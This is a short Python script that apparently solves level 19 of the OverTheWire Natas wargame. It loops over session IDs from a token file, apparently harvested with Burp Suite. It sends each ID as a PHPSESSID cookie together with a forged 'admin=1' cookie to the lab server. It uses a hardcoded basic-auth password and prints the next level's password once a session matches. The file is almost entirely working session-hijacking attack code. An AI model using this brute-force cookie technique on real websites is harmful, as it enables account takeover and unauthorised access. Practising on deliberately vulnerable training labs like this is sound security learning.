import requests
import re
from requests.auth import HTTPBasicAuth

#Capture tokens via the burp suite sequencer tab

try:
	print("\nStart...\n")
	with open("tokens.txt", "r") as f:
		for session in f:
			resp = requests.get("http://natas19.natas.labs.overthewire.org/index.php", auth=HTTPBasicAuth("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"), cookies={"PHPSESSID": "{}".format(session.strip()), "admin": "1"})
			print(session.strip())
			if "Password: " in resp.text:
				print(re.search(r'Password: [a-zA-Z0-9]{0,32}', resp.text)[0])
				break
	print("\nFinish...\n")
except:
	pass
